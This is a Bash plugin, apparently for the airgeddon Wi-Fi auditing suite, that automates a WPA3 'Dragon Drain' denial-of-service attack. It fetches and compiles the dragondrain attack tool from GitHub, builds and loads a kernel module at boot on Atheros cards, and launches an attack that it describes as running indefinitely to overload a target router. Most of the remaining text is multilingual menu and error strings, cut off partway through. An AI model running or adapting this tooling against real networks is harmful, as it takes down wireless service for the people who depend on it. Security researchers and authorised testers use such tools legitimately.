#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="WPA3 Dragon Drain"
plugin_description="A plugin to perform a WPA3 Dragon Drain DoS attack"
plugin_author="Janek"

plugin_enabled=1

plugin_minimum_ag_affected_version="11.52"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("Kali" "Kali arm" "Parrot" "Parrot arm" "Debian" "Ubuntu" "Mint" "Backbox" "Raspberry Pi OS" "Raspbian" "Cyborg" "Puppy")

dragon_drain_dir="/dragondrain/"
dragon_drain_binary_path="${dragon_drain_dir}src/dragondrain"
dragon_drain_install_path="/usr/local/bin/$(basename "${dragon_drain_binary_path}")"
dragon_drain_repo="https://github.com/vanhoefm/dragondrain-and-time"
ath_masker_dir="/ath_masker/"
ath_masker_repo="https://github.com/vanhoefm/ath_masker"
dragon_drain_dependencies_installed=0
ath_masker_dependencies_installed=0
linux_headers_installed=0

#Custom function. Execute WPA3 Dragon Drain attack
function exec_wpa3_dragon_drain_attack() {

	debug_print

	rm -rf "${tmpdir}agwpa3"* > /dev/null 2>&1
	mkdir "${tmpdir}agwpa3" > /dev/null 2>&1

	recalculate_windows_sizes

	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"wpa3 dragon drain attack\"" "${python3} ${scriptfolder}${plugins_dir}wpa3_dragon_drain_attack.py ${bssid} ${channel} ${interface} ${dragon_drain_install_path} | tee ${tmpdir}agwpa3/${wpa3log_file} ${colorize}" "wpa3 dragon drain attack" "active"
	wait_for_process "${python3} ${scriptfolder}${plugins_dir}wpa3_dragon_drain_attack.py ${bssid} ${channel} ${interface} ${dragon_drain_install_path}" "wpa3 dragon drain attack"
}

#Custom function. Validata if Dragon Drain binary exists
function dragon_drain_validation() {

	debug_print

	if ! [ -f "${dragon_drain_install_path}" ]; then
		echo
		language_strings "${language}" "wpa3_dragon_drain_attack_4" "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi

	return 0
}

#Custom function. Check if ath_masker module is installed
function ath_masker_module_checker() {

	debug_print

	if ! lsmod | grep -q "ath_masker"; then
		return 1
	fi

	return 0
}

#Custom function. Check if Linux headers are installed and the correct name of the package in the distro
function check_linux_headers_package() {

	debug_print

	local arch
	local headers_metapackage
	local headers_unamepackage

	arch=$(dpkg --print-architecture)
	headers_metapackage="linux-headers-${arch}"
	headers_unamepackage="linux-headers-$(uname -r)"

	if dpkg -l | grep -q "${headers_unamepackage}"; then
		linux_headers_installed=1
		return 0
	fi

	if ! apt-cache show "${headers_metapackage}" > /dev/null 2>&1; then
		if ! apt-cache show linux-headers-"$(uname -r)" > /dev/null 2>&1; then
			return 1
		else
			headers_package="${headers_unamepackage}"
		fi
	else
		headers_package="${headers_metapackage}"
	fi

	return 0
}

#Custom function. Install missing dependencies if needed
#shellcheck disable=SC2181
function install_dragon_drain_dependencies() {

	debug_print

	local dependencies_result
	local ath_masker_dependencies_result

	if [ "${dragon_drain_dependencies_installed}" -eq 0 ]; then
		echo
		language_strings "${language}" "wpa3_dragon_drain_attack_14" "blue"
		language_strings "${language}" 115 "read"

		export DEBIAN_FRONTEND=noninteractive
		update_output=$(apt update 2>&1)
		install_output=$(apt -y install autoconf automake libtool shtool libssl-dev pkg-config git 2>&1)
		dependencies_result=$?

		if [ "${linux_headers_installed}" -eq 0 ]; then
			if is_atheros_chipset && [[ "${ath_masker_dependencies_installed}" -eq 0 ]]; then
				install_output+=$(apt -y install "${headers_package}" 2>&1)
				ath_masker_dependencies_result=$?

				if [[ "${ath_masker_dependencies_result}" -eq 0 ]]; then
					ath_masker_dependencies_installed=1
				fi
			fi
		fi

		if [[ "${dependencies_result}" -ne 0 ]]; then
			echo
			language_strings "${language}" "wpa3_dragon_drain_attack_5" "red"
			language_strings "${language}" 115 "read"

			ask_yesno "wpa3_dragon_drain_attack_6" "yes"
			if [ "${yesno}" = "y" ]; then
				echo "${update_output}"
				echo "${install_output}"
				language_strings "${language}" 115 "read"
			fi

			return 1
		else
			echo
			language_strings "${language}" "wpa3_dragon_drain_attack_8" "blue"
			language_strings "${language}" 115 "read"
			dragon_drain_dependencies_installed=1
		fi
	else
		echo
		language_strings "${language}" "wpa3_dragon_drain_attack_16" "blue"
	fi

	return 0
}

#Custom function. Handle specific requirements for Atheros chipsets
#shellcheck disable=SC2164
function handle_atheros_chipset_requirements() {

	debug_print

	if is_atheros_chipset; then
		if ! ath_masker_module_checker; then
			echo
			language_strings "${language}" "wpa3_dragon_drain_attack_10" "yellow"
			language_strings "${language}" 115 "read"

			echo
			rm -rf "${ath_masker_dir}" 2> /dev/null
			git clone --depth 1 "${ath_masker_repo}" "${ath_masker_dir}"
			cd "${ath_masker_dir}"
			make

			mkdir -p "/lib/modules/$(uname -r)/kernel/drivers/net/wireless/"
			cp ath_masker.ko "/lib/modules/$(uname -r)/kernel/drivers/net/wireless/"
			depmod -a

			echo -e "ath\nath_masker" | tee /etc/modules-load.d/ath_masker.conf > /dev/null
			echo "softdep ath_masker pre: ath" | tee /etc/modprobe.d/ath_masker.conf > /dev/null

			modprobe ath
			modprobe ath_masker

			ip link set "${interface}" down > /dev/null 2>&1
			sleep 1
			ip link set "${interface}" up > /dev/null 2>&1

			cd "${scriptfolder}"
			rm -rf "${ath_masker_dir}" 2> /dev/null

			if ath_masker_module_checker; then
				echo
				language_strings "${language}" "wpa3_dragon_drain_attack_11" "blue"
				language_strings "${language}" 115 "read"
			else
				echo
				language_strings "${language}" "wpa3_dragon_drain_attack_12" "yellow"
				language_strings "${language}" 115 "read"
			fi
		else
			echo
			language_strings "${language}" "wpa3_dragon_drain_attack_13" "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Custom function. Install and compile Dragon Drain binary
#shellcheck disable=SC2164
function dragon_drain_installation_and_compilation() {

	debug_print

	echo
	rm -rf "${dragon_drain_dir}" 2> /dev/null
	git clone --depth 1 "${dragon_drain_repo}" "${dragon_drain_dir}"
	cd "${dragon_drain_dir}"
	sed -i '/\/\/ Easiest is to just call ifconfig and iw/i \/*' "${dragon_drain_dir}src/dragondrain.c"
	sed -i 's|// Open interface again|*/ // Open interface again|' "${dragon_drain_dir}src/dragondrain.c"
	autoreconf -i
	./autogen.sh
	./configure
	sed -i '42s/ __packed//' "${dragon_drain_dir}src/aircrack-osdep/radiotap/radiotap.h"
	make
	compilation_result=$?

	if [ "${compilation_result}" -ne 0 ]; then
		echo
		language_strings "${language}" "wpa3_dragon_drain_attack_9" "red"
		language_strings "${language}" 115 "read"
	else
		chmod +x "${dragon_drain_binary_path}" 2> /dev/null
		ln -s "${dragon_drain_binary_path}" "${dragon_drain_install_path}"
		chmod +x "${dragon_drain_install_path}" 2> /dev/null
		echo
		language_strings "${language}" "wpa3_dragon_drain_attack_7" "blue"
	fi

	return "${compilation_result}"
}

#Custom function. Validate if the needed plugin python file exists
function python3_wpa3_dragon_drain_script_validation() {

	debug_print

	if ! [ -f "${scriptfolder}${plugins_dir}wpa3_dragon_drain_attack.py" ]; then
		echo
		language_strings "${language}" "wpa3_dragon_drain_attack_3" "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	return 0
}

#Custom function. Validate if the system has python3.1+ installed and set python launcher
function python3_wpa3_dragon_drain_validation() {

	debug_print

	if ! hash python3 2> /dev/null; then
		if ! hash python 2> /dev/null; then
			echo
			language_strings "${language}" "wpa3_dragon_drain_attack_2" "red"
			language_strings "${language}" 115 "read"
			return 1
		else
			python_version=$(python -V 2>&1 | sed 's/.* \([0-9]\).\([0-9]\).*/\1\2/')
			if [ "${python_version}" -lt "31" ]; then
				echo
				language_strings "${language}" "wpa3_dragon_drain_attack_2" "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
			python3="python"
		fi
	else
		python_version=$(python3 -V 2>&1 | sed 's/.* \([0-9]\).\([0-9]\).*/\1\2/')
		if [ "${python_version}" -lt "31" ]; then
			echo
			language_strings "${language}" "wpa3_dragon_drain_attack_2" "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
		python3="python3"
	fi

	return 0
}

#Custom function. Prepare WPA3 dragon drain attack
#shellcheck disable=SC2164
function wpa3_dragon_drain_attack_option() {

	debug_print

	get_aircrack_version

	if ! validate_aircrack_wpa3_version; then
		echo
		language_strings "${language}" 763 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WPA3"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi

	if ! validate_wpa3_network; then
		return 1
	fi

	if ! python3_wpa3_dragon_drain_validation; then
		return 1
	fi

	if ! python3_wpa3_dragon_drain_script_validation; then
		return 1
	fi

	set_chipset "${interface}"
	if [ "${ath_masker_dependencies_installed}" -eq 0 ]; then
		if is_atheros_chipset && ! ath_masker_module_checker && ! check_linux_headers_package; then
			echo
			language_strings "${language}" "wpa3_dragon_drain_attack_15" "yellow"
			language_strings "${language}" 115 "read"
		fi
	fi

	if ! install_dragon_drain_dependencies; then
		return 1
	fi

	handle_atheros_chipset_requirements

	if ! dragon_drain_validation; then
		dragon_drain_installation_and_compilation
	fi

	cd "${scriptfolder}"
	wpa3log_file="ag.wpa3.log"

	if is_atheros_chipset || is_realtek_chipset || is_ralink_chipset; then
		echo
		language_strings "${language}" "wpa3_dragon_drain_attack_17" "blue"
		adjust_bitrate
	fi

	echo
	language_strings "${language}" 32 "green"
	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"

	exec_wpa3_dragon_drain_attack
}

#Custom function. Adjust bitrate based on some chipsets to improve reliability
function adjust_bitrate() {

	debug_print

	local bitrate_band
	bitrate_band="2.4"

	if [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]]; then
		bitrate_band="5"
	fi

	ip link set "${interface}" down > /dev/null 2>&1
	iw "${interface}" set type managed > /dev/null 2>&1
	ip link set "${interface}" up > /dev/null 2>&1
	sleep 1

	if ! iw "${interface}" set bitrates legacy-"${bitrate_band}" 54; then
		echo
		echo "Chipset: ${chipset}"
	fi

	ip link set "${interface}" down > /dev/null 2>&1
	iw "${interface}" set monitor control > /dev/null 2>&1
	ip link set "${interface}" up > /dev/null 2>&1
}

#Custom function. Atheros chipset detector
function is_atheros_chipset() {

	debug_print

	if [[ "${chipset,,}" =~ atheros ]]; then
		return 0
	fi

	return 1
}

#Custom function. Realtek chipset detector
function is_realtek_chipset() {

	debug_print

	if [[ "${chipset,,}" =~ realtek ]]; then
		return 0
	fi

	return 1
}

#Custom function. Ralink chipset detector
function is_ralink_chipset() {

	debug_print

	if [[ "${chipset,,}" =~ ralink ]]; then
		return 0
	fi

	return 1
}

#Prehook hookable_wpa3_attacks_menu function to modify wpa3 menu options
function wpa3_dragon_drain_prehook_hookable_wpa3_attacks_menu() {

	if [ "${arr['ENGLISH',756]}" = "5.  WPA3 Dragon Drain attack" ]; then
		plugin_x="wpa3_dragon_drain_attack_option"
		plugin_x_under_construction=""
	elif [ "${arr['ENGLISH',757]}" = "6.  WPA3 Dragon Drain attack" ]; then
		plugin_y="wpa3_dragon_drain_attack_option"
		plugin_y_under_construction=""
	fi
}

#Prehook for hookable_for_languages function to modify language strings
#shellcheck disable=SC1111
function wpa3_dragon_drain_prehook_hookable_for_languages() {

	if [ "${arr['ENGLISH',756]}" = "5.  WPA3 attack (use a plugin here)" ]; then
		arr["ENGLISH",756]="5.  WPA3 Dragon Drain attack"
		arr["SPANISH",756]="5.  Ataque Dragon Drain WPA3"
		arr["FRENCH",756]="5.  Attaque de Dragon Drain WPA3"
		arr["CATALAN",756]="5.  Atac WPA3 Dragon Drain"
		arr["PORTUGUESE",756]="5.  Ataque Dragon Drain WPA3"
		arr["RUSSIAN",756]="5.  Атака WPA3 Dragon Drain"
		arr["GREEK",756]="5.  Επίθεση WPA3 Dragon Drain"
		arr["ITALIAN",756]="5.  Attacco WPA3 Dragon Drain"
		arr["POLISH",756]="5.  Atak WPA3 Dragon Drain"
		arr["GERMAN",756]="5.  WPA3 Dragon Drain Angriff"
		arr["TURKISH",756]="5.  WPA3 Dragon Drain saldırı"
		arr["ARABIC",756]="5.  WPA3 Dragon Drain هجوم"
		arr["CHINESE",756]="5.  WPA3 Dragon Drain 攻击"
	elif [ "${arr['ENGLISH',757]}" = "6.  WPA3 attack (use a plugin here)" ]; then
		arr["ENGLISH",757]="6.  WPA3 Dragon Drain attack"
		arr["SPANISH",757]="6.  Ataque Dragon Drain WPA3"
		arr["FRENCH",757]="6.  Attaque de Dragon Drain WPA3"
		arr["CATALAN",757]="6.  Atac WPA3 Dragon Drain"
		arr["PORTUGUESE",757]="6.  Ataque Dragon Drain WPA3"
		arr["RUSSIAN",757]="6.  Атака WPA3 Dragon Drain"
		arr["GREEK",757]="6.  Επίθεση WPA3 Dragon Drain"
		arr["ITALIAN",757]="6.  Attacco WPA3 Dragon Drain"
		arr["POLISH",757]="6.  Atak WPA3 Dragon Drain"
		arr["GERMAN",757]="6.  WPA3 Dragon Drain Angriff"
		arr["TURKISH",757]="6.  WPA3 Dragon Drain saldırı"
		arr["ARABIC",757]="6.  WPA3 Dragon Drain هجوم"
		arr["CHINESE",757]="6.  WPA3 Dragon Drain 攻击"
	fi

	arr["ENGLISH","wpa3_dragon_drain_attack_1"]="WPA3 Dragon Drain attack runs forever aiming to overload the router (DoS)"
	arr["SPANISH","wpa3_dragon_drain_attack_1"]="El ataque Dragon Drain de WPA3 se ejecuta indefinidamente con el objetivo de sobrecargar el router (DoS)"
	arr["FRENCH","wpa3_dragon_drain_attack_1"]="\${pending_of_translation} L'attaque Dragon Drain de WPA3 s'exécute indéfiniment pour surcharger le routeur (DoS)"
	arr["CATALAN","wpa3_dragon_drain_attack_1"]="L'atac Dragon Drain de WPA3 s'executa indefinidament amb l'objectiu de sobrecarregar el router (DoS)"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_1"]="O ataque Dragon Drain do WPA3 executa indefinidamente com o objetivo de sobrecarregar o roteador (DoS)"
	arr["RUSSIAN","wpa3_dragon_drain_attack_1"]="\${pending_of_translation} Атака WPA3 Dragon Drain выполняется бесконечно, перегружая маршрутизатор (DoS)"
	arr["GREEK","wpa3_dragon_drain_attack_1"]="Η επίθεση WPA3 Dragon Drain εκτελείται συνεχώς με σκοπό να υπερφορτώσει τον δρομολογητή (DoS)"
	arr["ITALIAN","wpa3_dragon_drain_attack_1"]="\${pending_of_translation} L'attacco Dragon Drain WPA3 viene eseguito all'infinito per sovraccaricare il router (DoS)"
	arr["POLISH","wpa3_dragon_drain_attack_1"]="Atak WPA3 Dragon Drain działa nieustannie, próbując przeciążyć router poprzez wyczerpanie jego zasobów (DoS)"
	arr["GERMAN","wpa3_dragon_drain_attack_1"]="Der WPA3-Dragon-Drain-Angriff läuft ununterbrochen, um den Router zu überlasten (DoS)"
	arr["TURKISH","wpa3_dragon_drain_attack_1"]="\${pending_of_translation} WPA3 Dragon Drain saldırısı, yönlendiriciyi aşırı yüklemek amacıyla sonsuza dek devam eder (DoS)"
	arr["ARABIC","wpa3_dragon_drain_attack_1"]="\${pending_of_translation} (DoS) هجوم WPA3 Dragon Drain يستمر إلى ما لا نهاية بهدف إثقال كاهل جهاز التوجيه."
	arr["CHINESE","wpa3_dragon_drain_attack_1"]="针对 WPA3 的资源耗尽攻击将持续运行，旨在使路由器过载。 (即DoS)"
	wpa3_hints+=("wpa3_dragon_drain_attack_1")

	arr["ENGLISH","wpa3_dragon_drain_attack_2"]="This attack requires to have python3.1+ installed on your system"
	arr["SPANISH","wpa3_dragon_drain_attack_2"]="Este ataque requiere tener python3.1+ instalado en el sistema"
	arr["FRENCH","wpa3_dragon_drain_attack_2"]="Cette attaque a besoin de python3.1+ installé sur le système"
	arr["CATALAN","wpa3_dragon_drain_attack_2"]="Aquest atac requereix tenir python3.1+ instal·lat al sistema"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_2"]="Este ataque necessita do python3.1+ instalado no sistema"
	arr["RUSSIAN","wpa3_dragon_drain_attack_2"]="Для этой атаки необходимо, чтобы в системе был установлен python3.1+"
	arr["GREEK","wpa3_dragon_drain_attack_2"]="Αυτή η επίθεση απαιτεί την εγκατάσταση python3.1+ στο σύστημά σας"
	arr["ITALIAN","wpa3_dragon_drain_attack_2"]="Questo attacco richiede che python3.1+ sia installato nel sistema"
	arr["POLISH","wpa3_dragon_drain_attack_2"]="Ten atak wymaga zainstalowania w systemie python3.1+"
	arr["GERMAN","wpa3_dragon_drain_attack_2"]="Für diesen Angriff muss python3.1+ auf dem System installiert sein"
	arr["TURKISH","wpa3_dragon_drain_attack_2"]="Bu saldırı için sisteminizde, python3.1+'ün kurulu olmasını gereklidir"
	arr["ARABIC","wpa3_dragon_drain_attack_2"]="على النظام python3.1+ يتطلب هذا الهجوم تثبيت"
	arr["CHINESE","wpa3_dragon_drain_attack_2"]="此攻击需要在您的系统上安装 python3.1+"

	arr["ENGLISH","wpa3_dragon_drain_attack_3"]="The python3 script required as part of this plugin to run this attack is missing. Please make sure that the file \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" exists and that it is in the plugins dir next to the \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\" file"
	arr["SPANISH","wpa3_dragon_drain_attack_3"]="El script de python3 requerido como parte de este plugin para ejecutar este ataque no se encuentra. Por favor, asegúrate de que existe el fichero \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" y que está en la carpeta de plugins junto al fichero \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\""
	arr["FRENCH","wpa3_dragon_drain_attack_3"]="Le script de python3 requis dans cet plugin pour exécuter cette attaque est manquant. Assurez-vous que le fichier \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" existe et qu'il se trouve dans le dossier plugins à côté du fichier \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\""
	arr["CATALAN","wpa3_dragon_drain_attack_3"]="El script de python3 requerit com a part d'aquest plugin per executar aquest atac no es troba. Assegureu-vos que existeix el fitxer \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" i que està a la carpeta de plugins al costat del fitxer \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\""
	arr["PORTUGUESE","wpa3_dragon_drain_attack_3"]="O arquivo python para executar este ataque está ausente. Verifique se o arquivo \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" existe e se está na pasta de plugins com o arquivo \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\""
	arr["RUSSIAN","wpa3_dragon_drain_attack_3"]="Скрипт, необходимый этому плагину для запуска этой атаки, отсутствует. Убедитесь, что файл \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" существует и находится в папке для плагинов рядом с файлом \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\"."
	arr["GREEK","wpa3_dragon_drain_attack_3"]="Το python3 script που απαιτείται ως μέρος αυτής της προσθήκης για την εκτέλεση αυτής της επίθεσης λείπει. Βεβαιωθείτε ότι το αρχείο \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" υπάρχει και ότι βρίσκεται στον φάκελο plugins δίπλα στο αρχείο \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\""
	arr["ITALIAN","wpa3_dragon_drain_attack_3"]="Lo script python3 richiesto come parte di questo plugin per eseguire questo attacco è assente. Assicurati che il file \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" esista e che sia nella cartella dei plugin assieme al file \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\""
	arr["POLISH","wpa3_dragon_drain_attack_3"]="Do uruchomienia tego ataku brakuje skryptu python3 wymaganego jako część pluginu. Upewnij się, że plik \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" istnieje i znajduje się w folderze pluginów obok pliku \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\""
	arr["GERMAN","wpa3_dragon_drain_attack_3"]="Das python3-Skript, das als Teil dieses Plugins erforderlich ist, um diesen Angriff auszuführen, fehlt. Bitte stellen Sie sicher, dass die Datei \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" vorhanden ist und dass sie sich im Plugin-Ordner neben der Datei \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\" befindet"
	arr["TURKISH","wpa3_dragon_drain_attack_3"]="Bu saldırıyı çalıştırmak için bu eklentinin bir parçası olarak gereken python3 komutu dosyası eksik. Lütfen, eklentiler klasöründe \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\" dosyasının yanında, \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" dosyasının da var olduğundan emin olun"
	arr["ARABIC","wpa3_dragon_drain_attack_3"]="\"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\" موجود وأنه موجود في مجلد المكونات الإضافية بجوار الملف \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" المطلوب كجزء من هذا البرنامج المساعد لتشغيل هذا الهجوم مفقود. يرجى التأكد من أن الملف pyhton3 سكربت"
	arr["CHINESE","wpa3_dragon_drain_attack_3"]="作为此插件的一部分运行此攻击所需的 python3 脚本丢失。请确保文件 \"\${normal_color}wpa3_dragon_drain_attack.py\${red_color}\" 存在，并且位于 \"\${normal_color}wpa3_dragon_drain_attack.sh\${red_color}\" 旁边的插件目录中 文件"

	arr["ENGLISH","wpa3_dragon_drain_attack_4"]="The compiled Dragon Drain binary was not found in the expected location \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". It will now be installed and compiled. The entire process will be displayed on screen, as it may be useful in case of an error. This may take a few minutes. Please be patient and do not interrupt the process"
	arr["SPANISH","wpa3_dragon_drain_attack_4"]="No se encuentra el binario de Dragon Drain compilado en la ubicación esperada \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". Se procederá a instalarlo y compilarlo. Se mostrará por pantalla todo el proceso ya que puede ser útil en caso de error. Es posible que tome algunos minutos, por favor ten paciencia y no interrumpas el proceso"
	arr["FRENCH","wpa3_dragon_drain_attack_4"]="\${pending_of_translation} Le binaire Dragon Dragon compilé n'a pas été trouvé dans l'emplacement attendu \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". Il sera désormais installé et compilé. L'ensemble du processus sera affiché à l'écran, car il peut être utile en cas d'erreur. Cela peut prendre quelques minutes. Soyez patient et n'interrompez pas le processus"
	arr["CATALAN","wpa3_dragon_drain_attack_4"]="No es troba el binari de Dragon Drain compilat en la ubicació esperada \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". Es procedirà a instal·lar-ho i compilar-ho. Es mostrarà per pantalla tot el procés ja que pot ser útil en cas d'error. És possible que prengui alguns minuts, si us plau tingues paciència i no interrompis el procés"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_4"]="O binário do Dragon Drain não foi encontrado no local esperado \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". Agora ele será instalado e compilado. Todo o processo será exibido na tela, pois pode ser útil em caso de erro. Isso pode levar alguns minutos. Por favor, seja paciente e não interrompa o processo"
	arr["RUSSIAN","wpa3_dragon_drain_attack_4"]="\${pending_of_translation} Составленный двоичный файл Dragon Drain не был найден в ожидаемом месте \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". Теперь он будет установлен и составлен. Весь процесс будет отображаться на экране, так как он может быть полезен в случае ошибки. Это может занять несколько минут. Пожалуйста, будьте терпеливы и не перебивайте процесс"
	arr["GREEK","wpa3_dragon_drain_attack_4"]="Το compiled binary αρχείο Dragon Drain δεν βρέθηκε στην αναμενόμενη τοποθεσία \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". Θα γίνει τώρα εγκατάσταση και compile. Ολόκληρη η διαδικασία θα εμφανιστεί στην οθόνη, καθώς μπορεί να είναι χρήσιμη σε περίπτωση σφάλματος. Αυτό μπορεί να διαρκέσει μερικά λεπτά. Παρακαλούμε να είστε υπομονετικοί και μην διακόψετε τη διαδικασία"
	arr["ITALIAN","wpa3_dragon_drain_attack_4"]="\${pending_of_translation} Il binario Dragon Dragon compilato non è stato trovato nella posizione prevista \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". Ora verrà installato e compilato. L'intero processo verrà visualizzato sullo schermo, in quanto potrebbe essere utile in caso di errore. Questo potrebbe richiedere qualche minuto. Si prega di essere paziente e non interrompere il processo"
	arr["POLISH","wpa3_dragon_drain_attack_4"]="Narzędzie Dragon Drain nie zostało znalezione w oczekiwanej ścieżce \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". Zostanie teraz zainstalowane i skompilowane. Cały proces zostanie wyświetlony na ekranie, co może być przydatne w przypadku błędu. Może to potrwać kilka minut. Prosimy o cierpliwość i nie przerywanie procesu"
	arr["GERMAN","wpa3_dragon_drain_attack_4"]="Der kompilierte Dragon Drain-Binär wurde nicht an dem erwarteten Pfad \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\" gefunden. Es wird jetzt installiert und kompiliert. Der gesamte Vorgang wird auf dem Bildschirm angezeigt, da er bei einem Fehler nützlich sein kann. Dies kann ein paar Minuten dauern. Bitte sei geduldig und unterbricht den Prozess nicht"
	arr["TURKISH","wpa3_dragon_drain_attack_4"]="\${pending_of_translation} Derlenmiş ejderha drenaj ikili, beklenen yerde bulunamadı \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". Şimdi kurulacak ve derlenecek. Bir hata durumunda yararlı olabileceğinden, tüm işlem ekranda görüntülenecektir. Bu birkaç dakika sürebilir. Lütfen sabırlı olun ve süreci kesintiye uğratmayın"
	arr["ARABIC","wpa3_dragon_drain_attack_4"]="\${pending_of_translation} لم يتم العثور على ثنائي Dragon Dragon binary في الموقع المتوقع \"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\". سيتم تثبيته الآن وتجميعه. سيتم عرض العملية بأكملها على الشاشة ، حيث قد تكون مفيدة في حالة وجود خطأ. هذا قد يستغرق بضع دقائق. يرجى التحلي بالصبر ولا تقاطع العملية"
	arr["CHINESE","wpa3_dragon_drain_attack_4"]="在预期位置未找到编译好的 Dragon Drain 二进制文件\"\${normal_color}\${dragon_drain_install_path}\${yellow_color}\"。现在将安装和编译。整个过程将显示在屏幕上，因为在错误的情况下可能很有用。这可能需要几分钟。请耐心等待，不要打扰该过程"

	arr["ENGLISH","wpa3_dragon_drain_attack_5"]="An error occurred while installing the dependencies. Check your Internet connection or if there is any problem on your system"
	arr["SPANISH","wpa3_dragon_drain_attack_5"]="Ocurrió un error instalando las dependencias. Revisa tu conexión a Internet o si existe algún problema en tu sistema"
	arr["FRENCH","wpa3_dragon_drain_attack_5"]="\${pending_of_translation} Une erreur s'est produite en installant les dependencies. Vérifiez votre connexion Internet ou s'il y a un problème dans votre système"
	arr["CATALAN","wpa3_dragon_drain_attack_5"]="S'ha produït un error instal·lant les dependencies. Comproveu la vostra connexió a Internet o si hi ha algun problema al vostre sistema"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_5"]="Ocorreu um erro ao instalar as dependências. Verifique sua conexão com a Internet ou se há algum problema em seu sistema"
	arr["RUSSIAN","wpa3_dragon_drain_attack_5"]="\${pending_of_translation} Ошибка произошла путем установки единиц. Проверьте подключение к Интернету или если есть какие -либо проблемы в вашей системе"
	arr["GREEK","wpa3_dragon_drain_attack_5"]="Παρουσιάστηκε σφάλμα κατά την εγκατάσταση των dependencies. Ελέγξτε τη σύνδεσή σας στο διαδίκτυο ή εάν υπάρχει κάποιο πρόβλημα στο σύστημά σας"
	arr["ITALIAN","wpa3_dragon_drain_attack_5"]="\${pending_of_translation} Si è verificato un errore installando le unità. Controlla la tua connessione Internet o se c'è qualche problema nel sistema"
	arr["POLISH","wpa3_dragon_drain_attack_5"]="Instalacja zależności nie powiodła się. Sprawdź, czy masz połączenie internetowe i czy system działa poprawnie"
	arr["GERMAN","wpa3_dragon_drain_attack_5"]="Beim Installieren der Abhängigkeiten ist ein Fehler aufgetreten. Überprüfen Sie Ihre Internetverbindung oder ob ein Problem mit Ihrem System vorliegt"
	arr["TURKISH","wpa3_dragon_drain_attack_5"]="\${pending_of_translation} Birimlerin kurulmasıyla bir hata oluştu. İnternet bağlantınızı kontrol edin veya sisteminizde herhangi bir sorun varsa"
	arr["ARABIC","wpa3_dragon_drain_attack_5"]="\${pending_of_translation} حدث خطأ عن طريق تثبيت الوحدات. تحقق من اتصال الإنترنت الخاص بك أو إذا كان هناك أي مشكلة في نظامك"
	arr["CHINESE","wpa3_dragon_drain_attack_5"]="安装依赖时发生了一个错误。检查您的网络连接或系统是否有其他问题"

	arr["ENGLISH","wpa3_dragon_drain_attack_6"]="Do you want to see the output of the error occurred while updating/installing? \${blue_color}Maybe this way you might find the root cause of the problem \${normal_color}\${visual_choice}"
	arr["SPANISH","wpa3_dragon_drain_attack_6"]="¿Quieres ver la salida del error que dio al actualizar/instalar? \${blue_color}De esta manera puede que averigües cuál fue el origen del problema \${normal_color}\${visual_choice}"
	arr["FRENCH","wpa3_dragon_drain_attack_6"]="\${pending_of_translation} Voulez-vous voir le résultat de l'erreur survenue lors de l'actualisation/installation?? \${blue_color}Peut-être de cette façon vous pourriez trouver la cause principale du problème \${normal_color}\${visual_choice}"
